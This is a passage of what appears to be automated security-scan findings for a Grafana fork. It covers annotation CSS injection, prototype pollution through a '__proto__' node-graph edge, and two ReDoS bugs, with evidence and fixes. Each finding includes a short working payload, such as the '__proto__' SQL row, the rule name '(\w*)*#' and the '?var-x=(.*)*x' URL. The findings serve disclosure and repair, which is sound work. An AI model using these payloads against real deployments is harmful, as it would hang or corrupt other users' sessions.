Attacker CSS and anchors in the victim's authenticated Grafana origin, unscoped to the annotation tooltip: UI redress, hiding/overlaying controls, phishing overlays and fake messages that an Editor cannot otherwise place outside their own panel markup (integrity, limited); external img/url() loads leak viewer presence/IP and attribute-selector CSS can exfiltrate attribute values present in the DOM (confidentiality, limited). No script execution or session theft; no availability impact.

## Reproduction steps
1. Attacker: an Editor (basic_editor holds fixed:annotations:writer; also any Editor authoring a dashboard annotation query whose datasource results they shape) or a compromised datasource. They store annotation text containing <style>/<a>/<img> markup. Every user who opens a dashboard with a time series, candlestick, heatmap, state timeline or status history panel and hovers or keyboard-focuses the annotation marker (routine action) has the HTML mounted document-wide; clicking pins it. Default configuration (CSP off, sanitize on), no bypass of any mechanism needed - DOMPurify's html profile permits these tags by design and the in-tree sanitizer adds no FORBID_TAGS for style.

## Recommended fix
Annotation title/text are rendered as HTML through a sanitizer profile (DOMPurify html) that permits <style> elements, style attributes, external <img> and arbitrary <a href>, so untrusted annotation content can restyle the whole document and place overlays outside its own tooltip. Fix criteria: Annotation tooltip HTML must not be able to affect elements outside the tooltip: <style> elements (and ideally style attributes and positioning properties) must be removed or scoped, matching at least the restrictions the Text-panel sanitizer applies, and only the inline formatting/links the feature needs should survive. Verify that an annotation containing <style>, position:fixed styles and an <img> beacon renders without altering page styling or issuing external requests, and that sanctioned links/formatting still render, in every panel that mounts AnnotationsPlugin.

---
**Severity:** LOW
**Status:** Open
**Category:** CSS injection
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256347

---

# Node graph edge referencing node id __proto__ writes stats onto Object.prototype

## Details
`processNodes` (`public/app/plugins/panel/nodeGraph/utils.ts`) builds its node lookup as a plain `{}` keyed by datasource-supplied node ids and then read-modify-writes the looked-up entry. When an edge's `target` cell is the string `__proto__`, the lookup resolves through the prototype chain to `Object.prototype` and the writes land there:

1. Edges-only frame (no nodes frame), lines 209-234: `nodesMap[target.id] = nodesMap[target.id] || target` is a no-op for `__proto__` (the getter returns `Object.prototype`, truthy; the setter re-assigns the same prototype). If the edge frame has a numeric field (`mainstat`, or the first number-typed field, see `getEdgeFields` 117-119), `Object.prototype.mainStatNumeric = <attacker number>` (223-224) and optionally `Object.prototype.secondaryStatNumeric` (228-229) are written, then `nodesMap['__proto__'].incoming++` writes `Object.prototype.incoming = NaN` (233).
2. Nodes+edges frames, line 189: `nodesMap[e.target].incoming++` writes `Object.prototype.incoming = NaN` when an edge targets `__proto__` and no node carries that id.

A target of `constructor` writes the same properties onto the global `Object` function instead. `processEdges` (264-273) resolves the same ids via the prototype chain (`Object.prototype.nodeRadius` is undefined so the `nodeR` fallback is used), so unlike an ordinary dangling id the hostile edge does not throw before the writes complete; the layout worker fails afterwards and the panel stays on its spinner, but the global prototype is already modified in the victim's tab. `processNodes` runs synchronously in a `useMemo` during panel render (`NodeGraph.tsx:164-167`), so no interaction is required.

Reachability: `getNodeGraphDataFrames` (581-601) accepts any frame with an `id` field or whose refId/name is `edges`, and `getGraphFrame` (686-699) classifies a frame with a `source` field as the edges frame. An Editor therefore only needs a query whose result has string columns `id`, `source`, `target` and a numeric column — any SQL datasource (`SELECT 'e1' AS id, 'a' AS source, '__proto__' AS target, 5 AS mainstat`), Prometheus `label_replace` in Table format, or the core TestData 'CSV Content' scenario (`dataquery.ts` `csv_content`; assumed, as documented, to return typed columns from the pasted CSV). A malicious/compromised datasource (threat-model adversary 4) reaches the same code for every user, and in Explore for frames marked `preferredVisualisationType: 'nodeGraph'` (`explore/utils/decorators.ts:69`).

Impact in the victim's SPA session: every object inherits enumerable `incoming` (NaN) and, on path 1, `mainStatNumeric`/`secondaryStatNumeric` numbers. Confirmed consumers in this tree: `logFrameLabelsToLabels` (`features/logs/logsFrame.ts:43-60`, `for…in` without own-property check) serialises the inherited keys as phantom labels `incoming: "null"`, `mainStatNumeric: "<n>"` on every log line shown afterwards; `queryIsEmpty` (`core/utils/query.ts:4-18`) reports every query non-empty so `runRequest.ts:206` and `QueryGroup.tsx:114` stop applying datasource default queries; `PanelModel` (`features/dashboard/state/PanelModel.ts:247`) uses lodash `defaultsDeep`, which — per the lodash 4.18.1 bundled in `public/build` (assumption: lodash's documented keysIn semantics for `merge`/`defaults`/`defaultsDeep`) — copies inherited enumerable keys, so panel models gain own `incoming`/`mainStatNumeric` keys that are serialised into saved dashboard JSON. Property names are fixed and values are numbers, so there is no code execution or disclosure; the effect is a session-wide integrity corruption crossing the Editor→Viewer/Admin boundary.

## Evidence
1. [public/app/plugins/panel/nodeGraph/utils.ts:209–234](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L209-L234)
   Edges-only path of processNodes: `nodesMap` is a plain `{}` keyed by the datasource's source/target id strings. `nodesMap[target.id] = nodesMap[target.id] || target` is a no-op for `target.id === '__proto__'` (the lookup returns Object.prototype, which is truthy), and the following lines then execute `nodesMap['__proto__'].mainStatNumeric = (… ?? 0) + edgeFields.mainStat.values[i]`, `nodesMap['__proto__'].secondaryStatNumeric = …` and `nodesMap['__proto__'].incoming++`, i.e. they write `mainStatNumeric` (attacker-chosen number), `secondaryStatNumeric` and `incoming` (NaN) onto `Object.prototype`. A target id of `constructor` writes the same properties onto the global `Object` function. This is the code the fix must change (Map / null-prototype object, own-entry check).
2. [public/app/plugins/panel/nodeGraph/utils.ts:177–190](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L177-L190)
   Nodes+edges path: `nodesMap[e.target].incoming++` for every edge. When an edge's target is `__proto__` and no node carries that id, `nodesMap['__proto__']` is Object.prototype and `Object.prototype.incoming` becomes NaN. (A node whose own id is `__proto__` instead rewires nodesMap's prototype at line 181 and is silently dropped from `Object.values`.)
3. [public/app/plugins/panel/nodeGraph/utils.ts:255–284](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L255-L284)
   processEdges resolves `nodesMap[source]` / `nodesMap[target]` through the prototype chain as well (`targetNode.nodeRadius` on Object.prototype is undefined, so the `nodeR` fallback is taken), so the hostile edge does not throw before the pollution happens; only ordinary unknown ids crash here.
4. [public/app/plugins/panel/nodeGraph/NodeGraph.tsx:164–166](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/NodeGraph.tsx#L164-L166)
   processNodes runs synchronously in a useMemo during render of the panel, so the write occurs as soon as the dashboard panel receives the frame — no interaction needed. NodeGraphPanel.tsx:31 feeds it `getNodeGraphDataFrames(data.series, options)`.
5. [public/app/plugins/panel/nodeGraph/utils.ts:581–607](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/nodeGraph/utils.ts#L581-L607)
   getNodeGraphDataFrames accepts any frame with an `id` field (or refId/name `edges`) and getGraphFrame (686-699) treats a frame with a `source` field as the edges frame, so an Editor can supply the edges frame from any datasource that returns string columns (TestData 'CSV Content', Prometheus label_replace in table format, SQL literals).
6. [public/app/features/logs/logsFrame.ts:43–60](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/logsFrame.ts#L43-L60)
   Gadget: `logFrameLabelsToLabels` iterates labels with `for…in` and no own-property check; the inherited non-string `incoming`/`mainStatNumeric` force the serialization branch and are copied as phantom labels (`incoming: "null"`, `mainStatNumeric: "<n>"`) onto every log line shown afterwards in the session.
7. [public/app/core/utils/query.ts:4–17](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/utils/query.ts#L4-L17)
   Gadget: `queryIsEmpty` uses `for (const key in query)`; the inherited keys are not in the DataQuery allow-list, so every query is reported non-empty for the rest of the session and runRequest.ts:206 / QueryGroup.tsx:114 stop applying datasource default queries.
8. [public/app/features/dashboard/state/PanelModel.ts:247](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard/state/PanelModel.ts#L247)
   Gadget: `defaultsDeep(this, cloneDeep(defaults))` — lodash (4.18.1 in public/build) `defaultsDeep` assigns own and inherited enumerable keys of its sources, so after pollution every PanelModel constructed in the session gains own `incoming`/`mainStatNumeric` keys that are serialised into saved dashboard JSON.

## Impact
Property names are fixed (`incoming`, `mainStatNumeric`, `secondaryStatNumeric`) and values are numbers/NaN, so no confidentiality impact and no code execution. Integrity LOW: for the rest of the session all for…in / lodash keysIn consumers see the inherited keys — phantom labels on every log line (logsFrame.ts), every query treated as non-empty (query.ts, runRequest.ts:206), PanelModel.defaultsDeep (PanelModel.ts:247) copies junk keys into panel models serialised into saved dashboards. No concrete crash gadget was found for these names, so availability is NONE (the affected node graph panel itself merely stays on its loading spinner).

## Reproduction steps
1. An Editor saves a dashboard with a node graph panel whose query returns an edges frame containing a row `id=e1, source=a, target=__proto__, mainstat=<n>` — any org datasource that echoes chosen string columns suffices (SQL literal select, Prometheus label_replace in Table format, core TestData 'CSV Content'). Any Viewer/Admin opening the dashboard triggers processNodes during render (NodeGraph.tsx:164-167); the writes to Object.prototype happen before the layout failure and no defence exists in the path. Works on a default deployment with the core nodeGraph panel; a compromised datasource reaches it with no Grafana account, for every user who views the panel or opens it in Explore.

## Recommended fix
processNodes/processEdges use a plain object keyed by untrusted node ids and read-modify-write the looked-up entry, so ids that name inherited properties (`__proto__`, `constructor`, `toString`, …) resolve to shared globals instead of nodes. Fix criteria: Node lookups keyed by datasource ids must use a `Map` or a null-prototype object and must only touch own entries; an edge whose source/target is not an own node must be rejected or ignored like any other dangling reference. After the fix, an edges frame with target `__proto__` or `constructor` leaves `Object.prototype` and `Object` unchanged and produces the same user-visible result as any unknown node id.

---
**Severity:** LOW
**Status:** Open
**Category:** Prototype pollution
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256346

---

# Prometheus recording-rule names compiled unescaped into RegExp hang or crash the query editor

## Details
The Prometheus datasource frontend fetches the upstream's recording rules (`GET /api/v1/rules`, via the Grafana datasource proxy) on initialisation and keeps every recording rule's `name` as a key of `datasource.ruleMappings` (datasource.ts extractRuleMappingFromGroups, recovered lines 819-837; no character validation; `disableRecordingRules` defaults to false, line 119). Those names are later treated as regular-expression source text without escaping:

1. `query_hints.ts isRuleInQuery()` (recovered line 183) builds `new RegExp(`(?<![\w:])${ruleName}(?=[\[{(\s\)]|$)`)` and runs `.test(query)`. `getExpandRulesHints()` (lines 187-192) calls it for every mapping key on every hint computation, before and regardless of whether the name appears in the query.
2. `language_utils.ts expandRecordingRules()` (line 49) builds a second RegExp from the same names when the user clicks the offered 'Expand rules' fix.

`getQueryHints()` (datasource.ts:646 → query_hints.ts:137-141, taken whenever `datasource.ruleMappings` is set) is executed synchronously inside React `useEffect`s in `PromQueryField.tsx` (Code mode and the alerting editor PromQueryEditorForAlerting.tsx, once a result arrives) and `QueryBuilderHints.tsx` (Builder mode, on every query/data change). Nothing catches exceptions there; the nearest boundary is `ErrorBoundaryAlert` in public/app/features/query/components/QueryEditorRow.tsx:623, which replaces the whole editor with an error alert.

`ruleMappings` is populated by `init()` (datasource.ts:150-153), which the host calls from Explore's `loadAndInitDatasource` (public/app/features/explore/state/utils.ts:115-122) whenever a datasource is selected in Explore; DatasourceSrv caches the instance per uid (public/app/features/plugins/datasource_srv.ts:267-268), so panel and alert-rule editors on the same page session share the poisoned mapping.

Attack: a malicious or compromised Prometheus-compatible upstream (threat-model adversary 4), or a machine-in-the-middle on the datasource path, returns on `/api/v1/rules` a recording rule whose `name` is
- an invalid pattern, e.g. `up(` → `new RegExp` throws SyntaxError → every Prometheus query editor row against that datasource unmounts into an error alert as soon as hints are computed; or
- a catastrophically backtracking pattern, e.g. `(\w*)*#` → `.test()` runs in exponential time against the identifier runs of whatever query the victim has typed (any metric name of ~25+ characters suffices) → the victim's browser tab hangs.

The upstream need not be a real Prometheus: the frontend accepts whatever JSON the configured URL returns. Where the upstream is a genuine shared ruler (Mimir/Cortex/Thanos tenant with rule-write access), the attack additionally depends on that ruler accepting such names (Prometheus 3 UTF-8 metric names do; this is not verifiable in the checkout).

The condition is deterministic and recurs on every attempt, so the Prometheus query editor (Explore, panel editor, alert-rule editor via the shared datasource instance once `init()` has run) is unusable against that datasource for every user until the upstream removes the rule. Victims need only open Explore with that datasource selected (Editors/Admins by default; Viewers where Explore is granted). No Grafana privileges are required of the attacker. Dashboards, other datasources and the rest of the Grafana UI remain usable.

Root cause: datasource-supplied identifiers are interpolated into RegExp source instead of being regex-escaped (or compared with plain string/tokenizer logic), and the RegExp is compiled and executed for every rule name rather than only for names actually present in the query.

Assumptions (dependencies not in checkout): browser RegExp engines (V8 Irregexp, SpiderMonkey) use backtracking without a step limit, so `(\w*)*#` is exponential; React 19.2.8 routes an exception thrown in a passive effect to the nearest error boundary.

## Evidence
1. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered source webpack://prometheus/../packages/grafana-prometheus/src/query_hints.ts lines 178-192 (sourcesContent). isRuleInQuery() does `new RegExp(`(?<![\\w:])${ruleName}(?=[\\[{(\\s\\)]|$)`)` and `.test(query)` with ruleName interpolated verbatim. getExpandRulesHints() (lines 187-195) calls it for EVERY key of datasource.ruleMappings on every hint computation, before checking whether the rule occurs in the query. A rule name containing regex metacharacters is therefore compiled and executed unconditionally: an unbalanced `(` throws SyntaxError out of getQueryHints(); a nested-quantifier name such as `(\w*)*#` backtracks exponentially against any identifier run in the user's query.
2. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered source .../src/language_utils.ts lines 48-50, 68: expandRecordingRules() builds `new RegExp(`(\\s|\\(|^)(${ruleName})(\\s|$|\\(|\\[|\\{)`, 'ig')` from the same upstream-supplied mapping keys and matches it against the user's query parts. Same source, second sink; reached when the user clicks the offered 'Expand rules' fix (modify_query.ts:60-66 → applyModifyQuery EXPAND_RULES). (The identifier/identifierValue regex at line 116 is built from the user's own query labels, not upstream data, and is not part of this finding.)
3. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered source .../src/datasource.ts lines 150-176 and 819-835 (sibling unit, read as context): init() → loadRules() fetches `/api/v1/rules` from the configured Prometheus-compatible upstream and extractRuleMappingFromGroups() copies every `rule.name` of type 'recording' verbatim as a key of this.ruleMappings. No character validation. disableRecordingRules defaults to false (line 119). getQueryHints(query, result) at line 646 forwards `this` (with ruleMappings) to query_hints.getQueryHints, which calls getExpandRulesHints whenever datasource.ruleMappings is truthy (query_hints.ts 137-141).
4. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   Recovered sources .../src/components/PromQueryField.tsx lines 56-78 and .../src/querybuilder/shared/QueryBuilderHints.tsx lines 33-38: both the Code-mode field and the Builder hints call datasource.getQueryHints(...) synchronously inside a React useEffect that re-runs on every data/query change. There is no try/catch, so a SyntaxError propagates to the nearest error boundary (QueryEditorRow's ErrorBoundaryAlert) and replaces the editor; a catastrophic-backtracking regex blocks the main thread instead.
5. [public/app/features/explore/state/utils.ts:115–121](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/state/utils.ts#L115-L121)
   Host code: loadAndInitDatasource() calls instance.init() whenever a datasource is selected in Explore, which is what triggers loadRules() and populates ruleMappings for the cached datasource instance (shared with the panel editor for the rest of the page session).

## Impact
No confidentiality or integrity effect. Availability: the Grafana frontend's Prometheus query editor against the hostile datasource is deterministically broken for every user — the editor row is replaced by an error boundary on each hint computation, or the victim's browser tab is hung by catastrophic backtracking — and recurs on every attempt until the upstream rule is removed. The impact is confined to that feature and the victim's own tab: dashboards, other datasources and the Grafana server are unaffected and the victim recovers by closing the tab or switching datasource, so this is interruption of a component rather than loss of the system (VA:L). Assumption (dependency not in checkout): standard backtracking RegExp semantics in V8/SpiderMonkey.

## Reproduction steps
1. Attacker position: the Prometheus-compatible upstream configured as a datasource (threat-model adversary 4: malicious/compromised datasource or the network path to it), or anyone who can place a recording rule in a shared ruler the datasource points at; no Grafana account needed (PR:N). Delivery: one recording rule whose name contains regex metacharacters, returned by /api/v1/rules and copied verbatim by extractRuleMappingFromGroups. Steps: victim opens Explore (or any query editor) with that datasource; loadAndInitDatasource → init → loadRules stores the name; hint computation (PromQueryField on first result, QueryBuilderHints on every change) → isRuleInQuery → new RegExp/test → SyntaxError crash or exponential backtracking hang. Requires the hostile rule to sit in the upstream the target Grafana is configured against, hence AT:PRESENT; victim performs only routine actions (UI:PASSIVE).

## Recommended fix
1. isRuleInQuery() and expandRecordingRules() interpolate upstream-supplied recording rule names (and query label text) directly into RegExp source, so metacharacters change the pattern's structure and complexity. Fix criteria: Rule names and label values must never alter regex structure: escape all regex metacharacters before interpolation, or detect rule occurrences with the lezer PromQL tokenizer / plain string comparison instead of RegExp. Verify by loading rules named `up(` and `(\w*)*#` from a test upstream and confirming the Code and Builder editors render and respond normally with a long metric name typed.
2. getExpandRulesHints() compiles and executes a RegExp for every rule in the mapping on every hint recomputation, and the callers run it inside React effects without error containment, so one bad name takes down the whole editor. Fix criteria: Hint computation must be resilient: only consider rule names that occur as identifiers in the query (cheap substring/tokenizer pre-check), bound the work to that subset, and contain failures so that a hint error cannot unmount the editor or block the main thread. Verify that a datasource returning thousands of arbitrary rule names still yields a responsive editor and that an exception in hint generation only suppresses the hint.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256345

---

# Dashboard-authored regex matcher compiled with new RegExp in browser-side series filtering (ReDoS)

## Details
The bundled Prometheus datasource frontend (@grafana/prometheus, recovered from data/plugins-bundled/prometheus/module.js.map) performs browser-side filtering of /api/v1/series results whenever the datasource is configured so that `hasLabelsMatchAPISupport()` is false — i.e. the documented 'Use series endpoint' toggle (`jsonData.seriesEndpoint: true`) is on, or `prometheusType`/`prometheusVersion` are set below the labels-match-API threshold. In that mode `SeriesApiClient.queryLabelValues`/`queryLabelKeys` call `processSeries(series, key, false, effectiveMatch)`, which re-parses the PromQL selector and, for every returned series and every `=~`/`!~` matcher, executes `new RegExp(matchValue).test(itemValue)` (resource_clients.ts:445, 453).

The regex pattern is attacker-authored content: a dashboard Editor writes a template variable query such as `label_values(up{instance!~"(.*)*x"}, job)` (classic query string, or the structured LabelValues editor with a `!~` label filter, which is migrated back to the same string). No escaping, validation or length limit is applied anywhere on this path: metric_find_query.ts forwards the selector capture verbatim, parsing.ts getLabel strips only the quotes, and matchesLabelCondition's try/catch only handles syntax errors. Prometheus itself evaluates the matcher with RE2 (linear time) and, for `!~`, returns exactly the series whose `instance` does NOT match — so every returned value (e.g. `10.0.0.1:9100`, typically 15–40 characters with no `x`) is a worst-case input for the JavaScript backtracking engine. A classic nested-quantifier pattern like `(.*)*x` or `(.+)+x` is valid RE2, accepted by Prometheus, and takes exponential time to reject in V8; a single 30-character value is enough to hang the tab for minutes, and the loop repeats per series.

Attack path: Editor saves the dashboard → any Viewer (or Admin) opens it → PrometheusVariableSupport.query runs the variable query automatically in the victim's browser (variables.ts:53-55) → metric_find_query → languageProvider.queryLabelValues → SeriesApiClient → processSeries → catastrophic `RegExp.test` → the victim's Grafana tab becomes unresponsive. The same sink is reachable from the URL when a dashboard interpolates a single-value, non-multi variable into a `!~` matcher of a variable query (`?var-x=(.*)*x`; interpolateQueryExpr → prometheusRegularEscape escapes only `\` and `'`), and from ad-hoc filter keys/values via `extractResourceMatcher` → `SeriesApiClient.queryLabelKeys/queryLabelValues` when the viewer opens the filter dropdown.

This crosses the Editor→Viewer boundary of the threat model deterministically, but is conditional on the non-default series-endpoint / legacy-version datasource configuration; in the default configuration LabelsApiClient is used and no client-side regex is compiled. Impact is limited to availability of the victim's browser session.

## Evidence
1. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/resource_clients.ts:431-463] Recovered source packages/grafana-prometheus/src/resource_clients.ts:431-463 (matchesLabelCondition). For `=~`/`!~` operators the matcher value from the PromQL selector is compiled with `new RegExp(matchValue)` and `.test()`ed against every series label value returned by Prometheus. The pattern is not escaped, length-limited or validated; the only guard is try/catch for syntax errors, which does not stop catastrophic backtracking.
2. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/resource_clients.ts:372-393] resource_clients.ts:372-393 (processSeries). When `hasLabelsMatchAPISupport` is false the selector is re-parsed with buildVisualQueryFromString and every returned series is run through `labels.every(lbl => matchesLabelCondition(item[lbl.label], lbl.op, lbl.value))`, i.e. the regex is evaluated once per series per matcher in the viewer's browser.
3. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/resource_clients.ts:224-263 (and 210-222)] resource_clients.ts:224-263 (SeriesApiClient.queryLabelValues). The `match` string supplied by the variable query is parsed, re-rendered verbatim into `effectiveMatch` (`${utf8Support(lf.label)}${lf.op}"${lf.value}"`), sent to /api/v1/series, and then passed to processSeries(..., this.datasource.hasLabelsMatchAPISupport(), effectiveMatch) for client-side filtering. queryLabelKeys (210-222) does the same.
4. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/datasource.ts:221-256] datasource.ts:221-256 (hasLabelsMatchAPISupport). Returns false, selecting SeriesApiClient and the client-side regex filter, whenever jsonData.seriesEndpoint is true (documented 'Use series endpoint' toggle) or the configured flavor/version is below the match-API threshold (Prometheus <2.24, Cortex <1.11, Thanos <0.18).
5. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/metric_find_query.ts:46-56, 77-80] metric_find_query.ts:46-56 and 77-80. A classic variable query `label_values(<selector>, <label>)` is split by PrometheusLabelValuesRegex; the `<selector>` capture (containing the attacker's `instance!~"(.*)*x"` matcher) is forwarded unchanged as `match` to languageProvider.queryLabelValues → SeriesApiClient.
6. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/variables.ts:23-58] variables.ts:23-58 (PrometheusVariableSupport.query). Entry point: the variable query string comes straight from the saved dashboard JSON (request.targets[0].query), is template-interpolated (interpolateQueryExpr escapes only backslash/quote for single-value variables, leaving regex metacharacters intact) and handed to PrometheusMetricFindQuery. It runs automatically in every viewer's browser when the dashboard loads.
7. [data/plugins-bundled/prometheus/module.js.map](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/data/plugins-bundled/prometheus/module.js.map) (whole file)
   [module.js.map sourcesContent → packages/grafana-prometheus/src/querybuilder/parsing.ts:225-249] querybuilder/parsing.ts:225-249 (getLabel, sibling unit, read as context). The matcher value is extracted from the lezer StringLiteral with only the surrounding quotes stripped (`stringLiteral.replace(/^["'`]|["'`]$/g, '')`), so the regex pattern reaches matchesLabelCondition exactly as the dashboard author wrote it.

## Impact
Exponential regex backtracking runs on the main thread of the victim's browser for every returned series; the Grafana tab (dashboard, Explore, alerting UI if the same datasource is used) becomes unresponsive for minutes or until killed. No data is read or modified; the server is unaffected. Availability impact is confined to the victim's client session, hence LOW rather than HIGH.

## Reproduction steps
1. Attacker: authenticated Editor (dashboard author). Delivery: save a dashboard whose Prometheus template variable query contains a `!~` matcher with a nested-quantifier regex (e.g. `label_values(up{instance!~"(.*)*x"}, job)`); alternatively craft a URL `?var-x=(.*)*x` against a dashboard that interpolates a single-value variable into a `!~` matcher (interpolateQueryExpr -> prometheusRegularEscape escapes only backslash and single quote). Victim: any user who opens the dashboard; PrometheusVariableSupport.query runs the variable query automatically on load, metric_find_query forwards the selector capture verbatim, language_provider.queryLabelValues hands it to SeriesApiClient, and processSeries evaluates `new RegExp(value).test(labelValue)` once per returned series. Requirement outside attacker control: the Prometheus datasource must be configured with the documented 'Use series endpoint' toggle (jsonData.seriesEndpoint) or a prometheusType/prometheusVersion below the labels-match-API threshold, so hasLabelsMatchAPISupport() is false and SeriesApiClient's client-side filter is active (AT:PRESENT); in the default configuration LabelsApiClient is used and no client-side regex is compiled. Assumption: the victim's browser JavaScript regex engine (V8 irregexp, SpiderMonkey, JavaScriptCore) is a backtracking engine without memoisation, so `(.*)*x` against a ~30-character value with no `x` takes exponential time; Prometheus itself evaluates the matcher with RE2 and, for `!~`, returns exactly the non-matching values that are worst-case inputs. No defensive mechanism to defeat; works reliably as written.

## Recommended fix
1. matchesLabelCondition (resource_clients.ts) compiles an untrusted PromQL regex matcher with JavaScript `new RegExp` and evaluates it with a backtracking engine against datasource-returned values, so dashboard/URL-authored patterns with nested quantifiers cause super-linear execution in the viewer's browser. Fix criteria: Client-side `=~`/`!~` evaluation must not be able to take super-linear time on attacker-chosen patterns: either remove the browser-side regex filtering (rely on Prometheus' server-side `match[]`, which is already sent), or evaluate matchers with a linear-time engine / anchored, validated subset with a hard pattern-and-input length cap. Verify by configuring `seriesEndpoint: true`, saving a variable query `label_values(up{instance!~"(.*)*x"}, job)` against a Prometheus with ≥1 series whose instance is ~30 non-`x` characters, and confirming the dashboard loads promptly.
2. processSeries applies the redundant client-side filter whenever hasLabelsMatchAPISupport() is false, even though every request path already passes the same selector as `match[]` to /api/v1/series, so the filter adds attack surface without a correctness benefit on servers that honour match[]. Fix criteria: The client-side filter should only run when the server demonstrably ignored `match[]` (or not at all), and when it runs it must treat the matcher values as data that may be adversarial. Verify that with 'Use series endpoint' enabled, label value/key lookups with regex matchers complete in time proportional to the response size regardless of pattern shape.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256344

---

